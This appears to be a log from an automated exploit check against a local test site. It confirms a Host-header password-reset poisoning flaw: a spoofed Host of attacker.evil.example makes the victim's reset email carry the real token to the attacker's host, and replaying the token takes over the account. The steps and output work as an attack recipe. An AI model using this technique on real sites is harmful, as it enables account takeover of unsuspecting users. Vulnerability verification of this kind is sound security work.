@@ -1,0 +1,16 @@
+========================================================================
+VULN-004: Host-header password-reset-link poisoning -> ATO
+target: http://localhost:34931
+========================================================================
+[INFO] sink: ResetModel builds the reset link via Route::link(absolute) from HTTP_HOST, ignoring live_site
+[SETUP] victim 'victim_7b993278' <victim_7b993278@example.invalid> (uid 67) created
+[STEP] [attacker] GET reset form + POST reset.request with Host: attacker.evil.example (consistent session)
+[INFO] reset.request -> HTTP 303, Location host reflects: http://attacker.evil.example/index.php/component/users/reset
+[INFO] captured reset link(s): ['http://attacker.evil.example/index.php/component/users/reset?layout=confirm&token=534f855468bfc7c891aa54328bbeea00']
+[PROOF] the victim's reset email links to the ATTACKER host carrying the REAL token: http://attacker.evil.example/index.php/component/users/reset?layout=confirm&token=534f855468bfc7c891aa54328bbeea00
+[STEP] [attacker] replaying the captured token on the real host: reset.confirm -> reset.complete
+[PROOF] the victim's stored password hash CHANGED after the attacker replayed the token
+[PROOF] the attacker can now log in as the victim with the attacker-set password -> ACCOUNT TAKEOVER
+
+[OK] exploit confirmed — Host-poisoned reset link delivered the real token; replaying it took over the victim account
+==> VULN-004: CONFIRMED — Host-header reset-link poisoning -> token capture -> password reset = account takeover
